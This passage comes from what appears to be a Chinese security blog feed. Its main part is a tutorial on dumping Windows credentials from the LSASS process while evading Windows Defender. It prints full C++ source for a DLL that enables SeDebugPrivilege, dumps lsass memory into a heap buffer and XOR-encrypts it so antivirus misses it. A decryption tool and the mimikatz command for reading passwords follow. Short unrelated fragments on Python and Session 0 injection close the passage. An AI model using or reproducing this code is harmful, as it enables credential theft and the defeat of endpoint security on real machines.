<li><code>sekurlsa::logonpasswords full</code>：从LSASS进程中提取登录密码的，<code>full</code>参数表示将尽可能多地显示关于登录会话和密码的信息</li>
</ul>
<img src="mimikatz免杀/image-20230716195338534.png" alt="image-20230716195338534" style="zoom:67%;" />	



<h1 id="绕过WD"><a href="#绕过WD" class="headerlink" title="绕过WD"></a>绕过WD</h1><h2 id="实现思路-1"><a href="#实现思路-1" class="headerlink" title="实现思路"></a>实现思路</h2><p>上述这种方法无法绕过WindowsDefender，因为defender对生成的dump文件检验比较严格，只要发现你这个dump文件是lsass进程的，立马就会查杀，当然也有方法去绕过，只需对dump的文件进行加密。</p>
<p>当然对dump文件加密也是有前提的，需要在dump文件没有写入磁盘前对其里面的数据加密，这样才能绕过Defender，代码的实现重点关注两个函数，分别是<code>MiniDumpWriteDump</code>和它的回调函数</p>
<p><img src="/mimikatz%E5%85%8D%E6%9D%80/image-20230716205829732.png" alt="image-20230716205829732"></p>
<h3 id="MiniDumpWriteDump"><a href="#MiniDumpWriteDump" class="headerlink" title="MiniDumpWriteDump"></a>MiniDumpWriteDump</h3><p><code>MiniDumpWriteDump</code> 是一个 Windows API 函数，此函数在<code>Dbghelp.dll</code> 库中定义，可以创建一个指定进程的内存转储文件（通常称为 “minidump” 文件）</p>
<p>以下是 <code>MiniDumpWriteDump</code> 函数的原型：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cppCopy codeBOOL <span class="title">MiniDumpWriteDump</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hProcess, <span class="comment">//一个打开的句柄，指向需要创建内存转储文件的进程</span></span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD ProcessId, <span class="comment">//需要创建内存转储文件的进程的进程ID</span></span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE hFile, <span class="comment">//一个打开的句柄，指向用于写入内存转储文件的文件,可置NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">  MINIDUMP_TYPE DumpType, <span class="comment">//一个 MINIDUMP_TYPE 枚举值，指定内存转储文件的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">  PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,  <span class="comment">//置NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, <span class="comment">//置NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">  PMINIDUMP_CALLBACK_INFORMATION CallbackParam  <span class="comment">//一个指向 MINIDUMP_CALLBACK_INFORMATION 结构的指针，这个结构包含了一个回调函数和一个用户定义的参数。在内存转储过程中，这个回调函数会被多次调用，可以用于控制转储的过程或修改转储的内容。如果不需要使用回调函数，这个参数可以为 NULL</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>



<h3 id="回调函数加密dump文件"><a href="#回调函数加密dump文件" class="headerlink" title="回调函数加密dump文件"></a>回调函数加密dump文件</h3><p>MiniDumpWriteDump函数有一个回调函数, 可以通过<code>callbackInput-&gt;CallbackType</code>来判断何时回调执行我们自定义的代码段</p>
<p>首先在<code>loStartCallback</code>中将status成员设置为<code>S_FALSE</code>, 其目的是在开始写入数据时，不会将数据写入磁盘；然后在<code>IoWriteAllCallback</code>中将status成员设置为<code>S_OK</code>, 其目的是在每次写入数据时，将其写入到申请的堆内存中, 这样方便后续的xor加密操作</p>
<p>这种数据的加密是在内存中执行的，而不是在文件中执行，因此能够绕过Defender的检测</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL CALLBACK <span class="title">minidumpCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in     PVOID callbackParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in     <span class="type">const</span> PMINIDUMP_CALLBACK_INPUT callbackInput,</span></span></span><br><span class="line"><span class="params"><span class="function">    __inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LPVOID destination = <span class="number">0</span>, source = <span class="number">0</span>;</span><br><span class="line">    DWORD bufferSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (callbackInput-&gt;CallbackType)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> IoStartCallback:</span><br><span class="line">        <span class="comment">// 在开始写入数据时，设置 Status 为 S_FALSE，这可能会取消默认的写入操作</span></span><br><span class="line">        callbackOutput-&gt;Status = S_FALSE;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IoWriteAllCallback:</span><br><span class="line">        <span class="comment">// 在每次写入数据时，将数据保存到预先分配的内存区域</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 Status 为 S_OK，这可能会取消默认的写入操作</span></span><br><span class="line">        callbackOutput-&gt;Status = S_OK;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// source 指向一块刚刚从 lsass 进程读取的内存数据，这块数据将会被写入到内存转储文件中</span></span><br><span class="line">        source = callbackInput-&gt;Io.Buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// destination 是我们想要保存这部分数据的位置，计算方法是 dumpBuffer 的开始地址加上这块数据在内存转储文件中的偏移量</span></span><br><span class="line">        destination = (LPVOID)((DWORD_PTR)buffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// bufferSize 是刚刚读取的内存数据的大小</span></span><br><span class="line">        bufferSize = callbackInput-&gt;Io.BufferBytes;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将内存数据从 source 复制到 destination</span></span><br><span class="line">        <span class="built_in">RtlCopyMemory</span>(destination, source, bufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IoFinishCallback:</span><br><span class="line">        <span class="comment">// 在完成写入数据时，设置 Status 为 S_OK</span></span><br><span class="line">        callbackOutput-&gt;Status = S_OK;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="完整代码-1"><a href="#完整代码-1" class="headerlink" title="完整代码"></a>完整代码</h2><p>以下是绕过WD的dumphash代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DbgHelp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment( lib, <span class="string">&quot;Dbghelp.lib&quot;</span> )</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// MiniDumpWriteDump 函数的类型定义</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* _MiniDumpWriteDump)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hProcess, DWORD ProcessId,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE hFile, MINIDUMP_TYPE DumpType,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    PMINIDUMP_CALLBACK_INFORMATION CallbackParam)</span></span>;</span><br><span class="line">_MiniDumpWriteDump MMiniDumpWriteDump = (_MiniDumpWriteDump)<span class="built_in">GetProcAddress</span>(</span><br><span class="line"><span class="comment">// 加载 Dbghelp.dll 并获取 MiniDumpWriteDump 函数的地址    </span></span><br><span class="line"><span class="built_in">LoadLibraryA</span>(<span class="string">&quot;Dbghelp.dll&quot;</span>), <span class="string">&quot;MiniDumpWriteDump&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为内存转储分配一个 75MB 的内存区域</span></span><br><span class="line">LPVOID buffer = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">75</span>);</span><br><span class="line">DWORD bytesRead = <span class="number">0</span>;</span><br><span class="line">DWORD bytesWritten = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否具有管理员权限</span></span><br><span class="line"><span class="function">BOOL <span class="title">CheckPrivilege</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL state;</span><br><span class="line">    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;</span><br><span class="line">    PSID AdministratorsGroup;</span><br><span class="line"></span><br><span class="line">    state = <span class="built_in">AllocateAndInitializeSid</span>(</span><br><span class="line">        &amp;NtAuthority,</span><br><span class="line">        <span class="number">2</span>,</span><br><span class="line">        SECURITY_BUILTIN_DOMAIN_RID,</span><br><span class="line">        DOMAIN_ALIAS_RID_ADMINS,</span><br><span class="line">        SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">        &amp;AdministratorsGroup);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (state)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">CheckTokenMembership</span>(<span class="literal">NULL</span>, AdministratorsGroup, &amp;state))</span><br><span class="line">        &#123;</span><br><span class="line">            state = FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">FreeSid</span>(AdministratorsGroup);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启用调试权限</span></span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hThis = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    <span class="built_in">OpenProcessToken</span>(hThis, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line">    LUID luid;</span><br><span class="line">    <span class="built_in">LookupPrivilegeValue</span>(<span class="number">0</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;seDebugPrivilege&quot;</span>), &amp;luid);</span><br><span class="line">    TOKEN_PRIVILEGES priv;</span><br><span class="line">    priv.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    priv.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    priv.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    BOOL isEnabiled = <span class="built_in">AdjustTokenPrivileges</span>(hToken, <span class="literal">false</span>, &amp;priv, <span class="built_in">sizeof</span>(priv), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (isEnabiled) &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hToken);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThis);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 lsass 进程的 PID</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetLsassPID</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD lsassPID = <span class="number">0</span>;</span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 processEntry = &#123;&#125;;</span><br><span class="line">    processEntry.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    LPCWSTR processName = <span class="string">L&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (_wcsicmp(processName, <span class="string">L&quot;lsass.exe&quot;</span>) != <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">Process32Next</span>(snapshot, &amp;processEntry);</span><br><span class="line">            processName = processEntry.szExeFile;</span><br><span class="line">            lsassPID = processEntry.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> lsassPID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">minidumpCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in     PVOID callbackParam,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in     <span class="type">const</span> PMINIDUMP_CALLBACK_INPUT callbackInput,</span></span></span><br><span class="line"><span class="params"><span class="function">    __inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">// 定义目标和源的内存地址以及缓冲区大小</span></span><br><span class="line">    LPVOID destination = <span class="number">0</span>, source = <span class="number">0</span>;</span><br><span class="line">    DWORD bufferSize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据回调类型进行不同的处理</span></span><br><span class="line">    <span class="keyword">switch</span> (callbackInput-&gt;CallbackType)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> IoStartCallback:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 在内存转储开始时，将状态设置为 S_FALSE</span></span><br><span class="line">        <span class="comment">// 即取消默认的写入操作，数据将不会写入文件中</span></span><br><span class="line">        callbackOutput-&gt;Status = S_FALSE;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">case</span> IoWriteAllCallback:</span><br><span class="line">        <span class="comment">// 在每次写入数据时，将状态设置为S_OK</span></span><br><span class="line">        <span class="comment">// 即通过自定义的方式来处理数据</span></span><br><span class="line">        callbackOutput-&gt;Status = S_OK;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存刚刚从 lsass 进程读取的内存数据的地址</span></span><br><span class="line">        source = callbackInput-&gt;Io.Buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算数据应存储的位置，该位置是预先分配的缓冲区的开始地址加上该数据在内存转储文件中的偏移量</span></span><br><span class="line">        destination = (LPVOID)((DWORD_PTR)buffer + (DWORD_PTR)callbackInput-&gt;Io.Offset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存刚刚读取的内存数据的大小</span></span><br><span class="line">        bufferSize = callbackInput-&gt;Io.BufferBytes;</span><br><span class="line">        bytesRead += bufferSize;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将数据从源地址复制到目标地址</span></span><br><span class="line">        <span class="built_in">RtlCopyMemory</span>(destination, source, bufferSize);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> IoFinishCallback:</span><br><span class="line">        <span class="comment">// 当内存转储完成时，将状态设置为 S_OK</span></span><br><span class="line">        callbackOutput-&gt;Status = S_OK;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Xor加密函数</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">Xorcrypt</span><span class="params">(<span class="type">char</span>* content, DWORD length, <span class="type">char</span>* secretKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (UINT i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        content[i] ^= secretKey[i % <span class="built_in">sizeof</span>(secretKey)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Dump</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line"></span><br><span class="line">    DWORD lsassPID = <span class="number">0</span>;  <span class="comment">//存放lsass进程的PID</span></span><br><span class="line">    HANDLE lHandle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否具有管理员权限</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CheckPrivilege</span>()) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用调试权限</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">EnableDebugPrivilege</span>()) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取lsass进程的PID</span></span><br><span class="line">    lsassPID = <span class="built_in">GetLsassPID</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 打开 lsass.exe 进程，并获取进程句柄</span></span><br><span class="line">    lHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, lsassPID);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置回调函数的参数，这里的回调函数是minidumpCallback</span></span><br><span class="line">    MINIDUMP_CALLBACK_INFORMATION callbackInfo;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;callbackInfo, <span class="built_in">sizeof</span>(MINIDUMP_CALLBACK_INFORMATION));</span><br><span class="line">    callbackInfo.CallbackRoutine = &amp;minidumpCallback;</span><br><span class="line">    callbackInfo.CallbackParam = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用MiniDumpWriteDump函数获取内存转储</span></span><br><span class="line">    BOOL isD = <span class="built_in">MMiniDumpWriteDump</span>(lHandle, lsassPID, <span class="literal">NULL</span>, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;callbackInfo);</span><br><span class="line">    <span class="keyword">if</span> (isD)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="comment">// 对存放在堆内存中的数据进行xor加密</span></span><br><span class="line">        <span class="type">long</span> <span class="type">int</span> size = bytesRead;</span><br><span class="line">        <span class="type">char</span>* securitySth = <span class="keyword">new</span> <span class="type">char</span>[size];</span><br><span class="line">        <span class="type">char</span>* key = (<span class="type">char</span>*)<span class="string">&quot;thisisgood&quot;</span>;</span><br><span class="line">        <span class="built_in">memcpy</span>(securitySth, buffer, bytesRead);</span><br><span class="line">        securitySth = <span class="built_in">Xorcrypt</span>(securitySth, bytesRead, key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建内存存储文件</span></span><br><span class="line">        HANDLE outFile = <span class="built_in">CreateFile</span>(<span class="string">L&quot;C:\\Windows\\Temp\\test.log&quot;</span>, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将xor加密后的数据写入存储文件中</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">WriteFile</span>(outFile, securitySth, bytesRead, &amp;bytesWritten, <span class="literal">NULL</span>))</span><br><span class="line">        &#123;   </span><br><span class="line"></span><br><span class="line">            <span class="comment">//printf(&quot;\n[+] to C:\\Windows\\Temp\\test.log\n&quot;);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">CloseHandle</span>(outFile);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule, </span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">Dump</span>();</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>以下是使用xor解密dump文件的代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> fBuffer[<span class="number">1</span>];  <span class="comment">// 文件缓冲区</span></span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;  <span class="comment">// 索引，用于按循环方式获取密钥</span></span><br><span class="line">    <span class="type">char</span>* key = (<span class="type">char</span>*)<span class="string">&quot;thisisgood&quot;</span>;  <span class="comment">// 密钥</span></span><br><span class="line">    <span class="type">int</span> keylen = <span class="built_in">sizeof</span>(key);  <span class="comment">// 获取密钥长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查参数数量是否正确</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;source&gt; &lt;destination&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以二进制读取模式打开源文件</span></span><br><span class="line">    FILE* fSource = <span class="built_in">fopen</span>(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fSource == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;Error opening source file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以二进制写入模式打开目标文件</span></span><br><span class="line">    FILE* fDest = <span class="built_in">fopen</span>(argv[<span class="number">2</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fDest == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;Error opening destination file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环读取源文件的每个字节，执行XOR操作并写入目标文件</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fread</span>(fBuffer, <span class="number">1</span>, <span class="number">1</span>, fSource) == <span class="number">1</span>) &#123;</span><br><span class="line">        fBuffer[<span class="number">0</span>] ^= key[index % keylen];  <span class="comment">// 对读取的字节执行XOR操作</span></span><br><span class="line">        <span class="built_in">fwrite</span>(fBuffer, <span class="number">1</span>, <span class="number">1</span>, fDest);  <span class="comment">// 将结果写入目标文件</span></span><br><span class="line">        index++;  <span class="comment">// 更新索引</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭文件</span></span><br><span class="line">    <span class="built_in">fclose</span>(fSource);</span><br><span class="line">    <span class="built_in">fclose</span>(fDest);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>运行方法和之前的差不多，只是多了个解密的步骤，需将dump后的文件进行xor解密后，然后再放到mimikatz读取密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\Xor解密文件.exe .\test.log 1.bin</span><br></pre></td></tr></table></figure>

<p><img src="/mimikatz%E5%85%8D%E6%9D%80/image-20230717173133038.png" alt="image-20230717173133038"></p>
<p>​	</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
<li><a href="https://tttang.com/archive/1810/#toc_silentprocessexitdump">https://tttang.com/archive/1810/#toc_silentprocessexitdump</a></li>
<li><a href="https://xz.aliyun.com/t/11199#toc-5">https://xz.aliyun.com/t/11199#toc-5</a></li>
</ul>
<p>​	</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2023/06/13/python/</url>
    <content><![CDATA[<h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>1.整数：Python可以处理任意大小的整数（包括负整数），同数学公式写法</p>
<p>2.浮点数：即小数，科学计数法时，小数点的位置可变，例如1.23x109和12.3x108是完全相等的。很大的浮点数用e表示10，1.23x10的9次方就是<code>1.23e9</code>，或者<code>12.3e8</code></p>
<p>3.整数和浮点数在计算机内部存储的方式是不同的，整数最准确（包括除法），浮点数可能会涉及四舍五入</p>
<p>4.字符串是以‘’</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/session0%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>当我们使用远程线程注入将dll注入至系统服务进程中往往会失败，这是因为大多数系统服务都是在Session0中运行的</p>
<p>“Session 0”是Windows操作系统中的一个特殊的会话，专门用于运行系统服务和其他在用户登录之前就需要运行的程序。从Windows Vista和Windows Server 2008开始，为了提高安全性，Windows将用户和系统服务分隔在不同的会话中。具体来说，所有的服务和系统任务都在Session 0中运行，而所有用户交互任务都在其他会话中运行</p>
<p>“Session 0注入”一般指的是把一个程序（通常是一个恶意程序）注入到Session 0的过程。因为Session 0有许多特权，所以如果恶意程序能够成功注入到Session 0，就可以获得比正常用户更高的权限，从而进行更多的恶意操作</p>
<p>然而，由于Windows Vista和后续版本的Windows的安全性提高，使得Session 0注入变得更加困难。尤其是，Session 0是隔离的，不能直接与用户的图形会话进行交互</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/07be2c8ed1a09d94715df0ee9e2f9fbd225360e3.png@855w_627h_progressive.webp" alt="image">	</p>
<p>​		</p>
<h1 id="远程线程注入函数调用流程"><a href="#远程线程注入函数调用流程" class="headerlink" title="远程线程注入函数调用流程"></a>远程线程注入函数调用流程</h1><h2 id="1-CreateRemoteThreadStub"><a href="#1-CreateRemoteThreadStub" class="headerlink" title="1.CreateRemoteThreadStub"></a>1.CreateRemoteThreadStub</h2><p><code>CreateRemoteThreadStub</code>是在<code>kernel32.dll</code>中，用于对<code>CreateRemoteThread</code>函数的封装，对<code>CreateRemoteThread</code>的参数进行处理，由原来的7个参数扩展到8个参数，并对<code>dwCreationFlags</code>参数进行安全处理</p>
<p><img src="/session0%E6%B3%A8%E5%85%A5/image-20230611165350503.png" alt="image-20230611165350503"></p>
<h2 id="2-CreateRemoteThread"><a href="#2-CreateRemoteThread" class="headerlink" title="2.CreateRemoteThread"></a>2.CreateRemoteThread</h2><p><code>CreateRemoteThread</code>函数位于KernelBase.dll中，最终调用了<code>NtCreateThreadEx</code>函数</p>
